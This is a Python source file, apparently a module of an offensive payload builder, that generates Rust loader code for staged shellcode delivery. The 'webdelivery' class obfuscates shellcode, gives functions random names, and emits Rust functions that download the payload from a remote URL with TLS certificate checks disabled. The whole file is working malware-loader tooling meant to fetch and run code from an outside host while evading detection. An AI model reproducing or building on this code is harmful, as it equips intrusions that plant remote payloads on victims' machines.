import random
import string
from rs.utils.formatters import *

class webdelivery:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        self.shellcodeType = type(shellcode).__name__
        if self.shellcodeType == "str":
            self.type = 'String'
            open(outfile, 'w').write(shellcode)
        elif self.shellcodeType == "bytes":
            self.type = f"[u8; {len(shellcode)}]"
            open(outfile, 'wb').write(shellcode)
        elif self.shellcodeType == "list":
            self.type = f"[&'static str; {len(shellcode)}]"
            open(outfile, 'w').write('\n'.join(shellcode))
        self.shellcode = globals()[f'{type(shellcode).__name__}_to_rs'](shellcode, 'obfuscated')
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)

    def imports(self) -> list[str]:
        return ['extern crate reqwest;',
                'use reqwest::blocking::Client;']

    def compilerOptions(self) -> list[str]:
        return ['reqwest = {version = "0.13.4", features = ["blocking"]}']

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}()')

    def codeblock(self) -> str:

        if self.shellcodeType == 'bytes':
            return f"""
fn {self.name}() -> {self.type}{{
    let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
    let response = client.get("{self.url}").send();
    response.unwrap().bytes().unwrap().as_ref().try_into().unwrap()
}}
"""
        elif self.shellcodeType == 'str':
            return f"""
fn {self.name}() -> {self.type} {{
    let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
    let response = client.get("{self.url}").send();
    response.unwrap().text().unwrap()
}}
"""
        elif self.shellcodeType == 'list':

            return f"""
fn {self.name}() -> Vec<String> {{
    let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
    let response = client.get("{self.url}").send();
    let responsetext = response.unwrap().text().unwrap();
    responsetext.split('\\n').map(String::from).collect()
}}
"""